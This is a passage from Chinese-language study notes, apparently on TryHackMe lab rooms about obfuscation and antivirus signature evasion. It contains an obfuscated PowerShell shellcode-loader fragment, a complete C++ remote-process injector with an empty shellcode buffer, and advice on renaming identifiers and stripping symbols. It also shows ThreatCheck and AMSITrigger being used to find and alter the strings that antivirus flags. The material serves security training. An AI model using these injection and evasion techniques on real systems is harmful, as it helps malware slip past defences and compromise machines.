<span class="line"><span style="color: #ABB2BF">([</span><span style="color: #C678DD">System.Runtime.InteropServices.Marshal</span><span style="color: #ABB2BF">]::GetDelegateForFunctionPointer((</span><span style="color: #56B6C2">Get-PA</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$xee2N</span><span style="color: #ABB2BF">) (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$ahb3O</span><span style="color: #ABB2BF">)), (</span><span style="color: #56B6C2">Get-TDef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">([</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">].MakeByRefType()) ([</span><span style="color: #C678DD">Bool</span><span style="color: #ABB2BF">])))).Invoke(</span><span style="color: #E06C75">$vbuf</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$vopcode.Length</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x20</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF">](</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)) | </span><span style="color: #56B6C2">Out-Null</span></span>
<span class="line"><span style="color: #ABB2BF">([</span><span style="color: #C678DD">System.Runtime.InteropServices.Marshal</span><span style="color: #ABB2BF">]::GetDelegateForFunctionPointer((</span><span style="color: #56B6C2">Get-PA</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$xee2N</span><span style="color: #ABB2BF">) (</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$yhe4c</span><span style="color: #ABB2BF">)), (</span><span style="color: #56B6C2">Get-TDef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">([</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">], [</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">].MakeByRefType()) ([</span><span style="color: #C678DD">UInt32</span><span style="color: #ABB2BF">])))).Invoke(</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$vbuf</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">IntPtr</span><span style="color: #ABB2BF">]</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, [</span><span style="color: #C678DD">ref</span><span style="color: #ABB2BF">](</span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">)) | </span><span style="color: #56B6C2">Out-Null</span></span></code></pre></div></div></figure>
<p>你可能会注意到一些 cmdlet 和函数保持其原始状态……这是为什么呢？你可能希望创建一个应用程序，它在被检测后仍然能够迷惑逆向工程师，但可能不会显得可疑。如果恶意软件开发者混淆所有 cmdlet 和函数，这会提高解释型和编译型语言的熵，从而导致 EDR 警报分数更高。如果一个解释型代码片段在日志中显得看似随机或明显经过大量混淆，也可能导致其显得可疑。</p>
<h4 id="Code-Structure-代码结构">Code Structure 代码结构</h4>
<ol>
<li><strong>添加垃圾代码（Junk Code）和代码重排（Reordering Code）</strong>
<ul>
<li><strong>目的</strong>：增加程序的<strong>复杂性</strong>，迷惑分析师。</li>
<li><strong>原理</strong>：在恶意代码中插入大量无用的、不执行的指令或代码块，或者打乱代码块的原始顺序。这使得分析师难以从一堆杂乱的代码中找出真正的恶意逻辑。</li>
<li><strong>适用范围</strong>：这种技术尤其适用于<strong>解释型语言</strong>（如 Python），因为它们的源代码通常是可见的，分析师可以直接查看。</li>
</ul>
</li>
<li><strong>分离相关代码（Separation of Related Code）</strong>
<ul>
<li><strong>目的</strong>：规避**启发式签名（Heuristic Signature）**检测。</li>
<li><strong>原理</strong>：启发式引擎会分析代码的<strong>上下文</strong>。例如，如果 <code>OpenFile</code> 和 <code>EncryptFile</code> 这两个 API 调用在代码中紧挨着出现，启发式引擎就可能判断这是一个勒索软件。攻击者通过<strong>随机化</strong>这些相关代码的出现位置，将它们分散在程序的各个角落，从而破坏这种上下文关联，欺骗引擎，让它认为这些是无害的独立操作。</li>
</ul>
</li>
</ol>
<h4 id="File-Compilation-Properties-文件和编译属性">File &amp; Compilation Properties 文件和编译属性</h4>
<p>当程序编译为调试版本时，编译器将包含一个符号文件。符号通常有助于调试二进制映像，并且可以包含全局和局部变量、函数名称和入口点。攻击者必须意识到这些可能的问题，以确保正确的编译实践，并且没有信息泄露给分析人员。</p>
<p>对攻击者来说幸运的是，符号文件可以通过编译器或在编译后轻松移除。要从像 Visual Studio 这样的编译器中移除符号，我们需要将编译目标从 <code>Debug</code> 更改为 <code>Release</code> ，或者使用像 mingw 这样更轻量级的编译器。</p>
<p>如果我们需要从预编译镜像中移除符号，可以使用命令行工具： <code>strip</code> 。</p>
<p>以编译型语言为例，我们可以观察一个用 C++ 编写的进程注入器，它向命令行报告其状态。</p>
<figure class="shiki cpp"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;windows.h&quot;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;iostream&gt;</span></span>
<span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&lt;string&gt;</span></span>
<span class="line"><span style="color: #C678DD">using</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">namespace</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">std</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">char*</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #ABB2BF">[])</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> shellcode[] </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">	HANDLE processHandle;</span></span>
<span class="line"><span style="color: #ABB2BF">	HANDLE remoteThread;</span></span>
<span class="line"><span style="color: #ABB2BF">	PVOID remoteBuffer;</span></span>
<span class="line"><span style="color: #ABB2BF">	string leaked </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;This was leaked in the strings&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">	processHandle </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, FALSE, </span><span style="color: #61AFEF">DWORD</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])));</span></span>
<span class="line"><span style="color: #ABB2BF">	cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Handle obtained for&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> processHandle;</span></span>
<span class="line"><span style="color: #ABB2BF">	remoteBuffer </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(processHandle, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, sizeof shellcode, (MEM_RESERVE </span><span style="color: #56B6C2">|</span><span style="color: #ABB2BF"> MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="color: #ABB2BF">	cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Buffer Created&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(processHandle, remoteBuffer, shellcode, sizeof shellcode, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Process written with buffer&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> remoteBuffer;</span></span>
<span class="line"><span style="color: #ABB2BF">	remoteThread </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(processHandle, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (LPTHREAD_START_ROUTINE)remoteBuffer, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(processHandle);</span></span>
<span class="line"><span style="color: #ABB2BF">	cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Closing handle&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> processHandle;</span></span>
<span class="line"><span style="color: #ABB2BF">	cout </span><span style="color: #C678DD">&lt;&lt;</span><span style="color: #ABB2BF"> leaked;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<p>让我们使用字符串来准确查看此源代码编译时泄露了什么。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">C:\&gt;.\strings.exe &quot;\Injector.exe&quot;</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">Strings v2.54 - Search for ANSI and Unicode strings in binary images.</span></span>
<span class="line"><span style="color: #abb2bf">Copyright (C) 1999-2021 Mark Russinovich</span></span>
<span class="line"><span style="color: #abb2bf">Sysinternals - www.sysinternals.com</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">!This program cannot be run in DOS mode.</span></span>
<span class="line"><span style="color: #abb2bf">&gt;FU</span></span>
<span class="line"><span style="color: #abb2bf">z&#39;;</span></span>
<span class="line"><span style="color: #abb2bf">z&#39;;</span></span>
<span class="line"><span style="color: #abb2bf">...</span></span>
<span class="line"><span style="color: #abb2bf">[snip]</span></span>
<span class="line"><span style="color: #abb2bf">...</span></span>
<span class="line"><span style="color: #abb2bf">Y_^[</span></span>
<span class="line"><span style="color: #abb2bf">leaked</span></span>
<span class="line"><span style="color: #abb2bf">shellcode</span></span>
<span class="line"><span style="color: #abb2bf">2_^[]</span></span>
<span class="line"><span style="color: #abb2bf">...</span></span>
<span class="line"><span style="color: #abb2bf">[snip]</span></span>
<span class="line"><span style="color: #abb2bf">...</span></span>
<span class="line"><span style="color: #abb2bf">std::_Adjust_manually_vector_aligned</span></span>
<span class="line"><span style="color: #abb2bf">&quot;invalid argument&quot;</span></span>
<span class="line"><span style="color: #abb2bf">string too long</span></span>
<span class="line"><span style="color: #abb2bf">This was leaked in the strings</span></span>
<span class="line"><span style="color: #abb2bf">Handle obtained for</span></span>
<span class="line"><span style="color: #abb2bf">Buffer Created</span></span>
<span class="line"><span style="color: #abb2bf">Process written with buffer</span></span>
<span class="line"><span style="color: #abb2bf">Closing handle</span></span>
<span class="line"><span style="color: #abb2bf">std::_Allocate_manually_vector_aligned</span></span>
<span class="line"><span style="color: #abb2bf">bad allocation</span></span>
<span class="line"><span style="color: #abb2bf">Stack around the variable &#39;</span></span>
<span class="line"><span style="color: #abb2bf">...</span></span>
<span class="line"><span style="color: #abb2bf">[snip]</span></span>
<span class="line"><span style="color: #abb2bf">...</span></span>
<span class="line"><span style="color: #abb2bf">8@9H9T9X9\\9h9|9</span></span>
<span class="line"><span style="color: #abb2bf">:$:(:D:H:</span></span>
<span class="line"><span style="color: #abb2bf">@1p1</span></span></code></pre></div></div></figure>
<p>所有的 iostream 都写入了字符串，甚至 shellcode 字节数组也泄露了。这是一个较小的程序，所以想象一下一个功能完善且未混淆的程序会是什么样子！</p>
<p>我们可以删除注释并替换有意义的标识符来解决这个问题，或者在 Windows 端编译好，拖到 Linux 端过去用 <code>strip filename</code> 就 OK 了，当然你也可以手动处理变量名，不过在这个例子中，你要把那个 string 和打印的字符串处理掉，strip 只会处理你的变量名。</p>
<figure class="shiki c"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">#include</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;windows.h&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char*</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> awoler</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">	HANDLE awerfu;</span></span>
<span class="line"><span style="color: #ABB2BF">	HANDLE rwfhbf;</span></span>
<span class="line"><span style="color: #ABB2BF">	PVOID iauwef;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">	awerfu </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">OpenProcess</span><span style="color: #ABB2BF">(PROCESS_ALL_ACCESS, </span><span style="color: #D19A66">FALSE</span><span style="color: #ABB2BF">, </span><span style="color: #61AFEF">DWORD</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">])));</span></span>
<span class="line"><span style="color: #ABB2BF">	iauwef </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">VirtualAllocEx</span><span style="color: #ABB2BF">(awerfu, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> awoler, (MEM_RESERVE </span><span style="color: #C678DD">|</span><span style="color: #ABB2BF"> MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">WriteProcessMemory</span><span style="color: #ABB2BF">(awerfu, iauwef, awoler, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF"> awoler, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	rwfhbf </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">CreateRemoteThread</span><span style="color: #ABB2BF">(awerfu, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, (LPTHREAD_START_ROUTINE)iauwef, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(awerfu);</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF">	</span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
<h1>Signature Evasion 特征码规避</h1>
<p>前几个房间提到了 Shellcode 会有特征，容易被杀软检测，然后又提到了杀软是怎么检测特征的，上一个房间教了混淆的原理，这个房间就是用来具体实践的。</p>
<h2 id="Signature-Identification-签名识别">Signature Identification 签名识别</h2>
<p>杀软是靠的特定的签名去识别恶意片段，所以我们需要找到程序中引起警报的片段。房间这里告诉我们用原生工具 <code>head</code> 、 <code>dd</code> 或 <code>split</code> 来分割已编译的二进制文件，我觉得这个挺繁琐的，后续可以用自动化工具完成这点。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/AntivirusBypass/Find-AVSignature.ps1">Find-AVSignature</a> 可以给定间隔对提供的字节范围进行分割，但这个也存在缺陷，他需要一个合适的间隔才能正常运行。如果我们给的间隔把一个签名直接在中间截断了，那么是不是就两段分割好的都找不到这个签名了？</p>
<p>另外这个脚本只观察二进制文件的字符串，而不是使用反病毒引擎的全部功能进行扫描，所以这里需要用其他工具去解决这个，例如 <a target="_blank" rel="noopener" href="https://github.com/matterpreter/DefenderCheck">DefenderCheck</a>, <a target="_blank" rel="noopener" href="https://github.com/rasta-mouse/ThreatCheck">ThreatCheck</a>, 和 <a target="_blank" rel="noopener" href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a>。</p>
<h3 id="ThreatCheck">ThreatCheck</h3>
<p>ThreatCheck 是 DefenderCheck 的一个分支，可以说是在这三者中使用最广泛/最可靠的。为了识别可能的签名，ThreatCheck 对拆分的已编译二进制文件利用了多个防病毒引擎，并报告其认为存在可疑字节的位置。</p>
<p>下面是 ThreatCheck 的基本用法，只需要提供一个文件和一个扫描引擎就能用了。</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">C:\&gt;ThreatCheck.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> --</span><span style="color: #E06C75">help</span></span>
<span class="line"><span style="color: #ABB2BF">  -</span><span style="color: #E06C75">e</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">engine</span><span style="color: #ABB2BF">    (</span><span style="color: #C678DD">Default</span><span style="color: #ABB2BF">: </span><span style="color: #E06C75">Defender</span><span style="color: #ABB2BF">) Scanning engine. Options: Defender,</span><span style="color: #E06C75"> AMSI</span></span>
<span class="line"><span style="color: #ABB2BF">  -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">file</span><span style="color: #ABB2BF">      Analyze a file on disk</span></span>
<span class="line"><span style="color: #ABB2BF">  -</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">       Analyze a file from a URL</span></span>
<span class="line"><span style="color: #ABB2BF">  --</span><span style="color: #E06C75">help</span><span style="color: #ABB2BF">          Display this help screen.</span></span>
<span class="line"><span style="color: #ABB2BF">  --</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">       Display version information.</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># Task </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF">/4实际用法 题目要求用的是 Defender 但是会被 WD 干 所以用 AMSI</span></span>
<span class="line"><span style="color: #ABB2BF">.\ThreatCheck.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> C:\</span><span style="color: #E06C75">Users</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Student</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Desktop</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Binaries</span><span style="color: #ABB2BF">\shell.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">e</span><span style="color: #ABB2BF"> AMSI</span></span></code></pre></div></div></figure>
<h3 id="AMSITrigger">AMSITrigger</h3>
<p>ThreatCheck 扫不了 PowerShell，但是这个工具可以</p>
<figure class="shiki cmd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">C:\&gt;amsitrigger.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> --</span><span style="color: #E06C75">help</span></span>
<span class="line"><span style="color: #ABB2BF">	-</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">inputfile</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">VALUE</span><span style="color: #ABB2BF">       Powershell filename</span></span>
<span class="line"><span style="color: #ABB2BF">	-</span><span style="color: #E06C75">u</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">url</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">VALUE</span><span style="color: #ABB2BF">             URL eg. &lt;</span><span style="color: #E06C75">https</span><span style="color: #ABB2BF">://</span><span style="color: #D19A66">10.1.1.1</span><span style="color: #ABB2BF">/</span><span style="color: #E06C75">Invoke</span><span style="color: #ABB2BF">-NinjaCopy.</span><span style="color: #E06C75">ps1</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">	-</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">format</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">VALUE</span><span style="color: #ABB2BF">          Output Format:</span></span>
<span class="line"><span style="color: #ABB2BF">	                              </span><span style="color: #D19A66">1</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75"> Only</span><span style="color: #ABB2BF"> show Triggers</span></span>
<span class="line"><span style="color: #ABB2BF">	                              </span><span style="color: #D19A66">2</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75"> Show</span><span style="color: #ABB2BF"> Triggers </span><span style="color: #C678DD">with</span><span style="color: #ABB2BF"> Line numbers</span></span>
<span class="line"><span style="color: #ABB2BF">	                              </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75"> Show</span><span style="color: #ABB2BF"> Triggers inline </span><span style="color: #C678DD">with</span><span style="color: #ABB2BF"> code</span></span>
<span class="line"><span style="color: #ABB2BF">	                              </span><span style="color: #D19A66">4</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75"> Show</span><span style="color: #ABB2BF"> AMSI </span><span style="color: #E06C75">calls</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">xmas</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">tree</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">mode</span><span style="color: #ABB2BF">)</span></span>
<span class="line"><span style="color: #ABB2BF">	-</span><span style="color: #E06C75">d</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">debug</span><span style="color: #ABB2BF">                 Show Debug Info</span></span>
<span class="line"><span style="color: #ABB2BF">	-</span><span style="color: #E06C75">m</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">maxsiglength</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">VALUE</span><span style="color: #ABB2BF">    Maximum signature Length </span><span style="color: #C678DD">to</span><span style="color: #ABB2BF"> cater </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF">,</span></span>
<span class="line"><span style="color: #ABB2BF">	                              </span><span style="color: #C678DD">default</span><span style="color: #ABB2BF">=</span><span style="color: #D19A66">2048</span></span>
<span class="line"><span style="color: #ABB2BF">	-</span><span style="color: #E06C75">c</span><span style="color: #ABB2BF">, --</span><span style="color: #E06C75">chunksize</span><span style="color: #ABB2BF">=</span><span style="color: #E06C75">VALUE</span><span style="color: #ABB2BF">       Chunk size </span><span style="color: #C678DD">to</span><span style="color: #ABB2BF"> send </span><span style="color: #C678DD">to</span><span style="color: #ABB2BF"> AMSIScanBuffer,</span></span>
<span class="line"><span style="color: #ABB2BF">	                              </span><span style="color: #C678DD">default</span><span style="color: #ABB2BF">=</span><span style="color: #D19A66">4096</span></span>
<span class="line"><span style="color: #ABB2BF">	-</span><span style="color: #E06C75">h</span><span style="color: #ABB2BF">, -?, --</span><span style="color: #E06C75">help</span><span style="color: #ABB2BF">              Show Help</span></span>
<span class="line"><span style="color: #ABB2BF">	</span></span>
<span class="line"><span style="color: #ABB2BF"># 他会告诉你识别的字符串是什么，去把他改掉就行</span></span>
<span class="line"><span style="color: #ABB2BF"># -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> 使用 </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF"> 他会把恶意代码标红</span></span>
<span class="line"><span style="color: #ABB2BF">.\amsitrigger.</span><span style="color: #E06C75">exe</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">i</span><span style="color: #ABB2BF"> bypass.</span><span style="color: #E06C75">ps1</span><span style="color: #ABB2BF"> -</span><span style="color: #E06C75">f</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1</span></span>
<span class="line"><span style="color: #ABB2BF">[+] </span><span style="color: #98C379">&quot;AmsiUtils&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">[+] </span><span style="color: #98C379">&quot;amsiInitFailed&quot;</span></span></code></pre></div></div></figure>
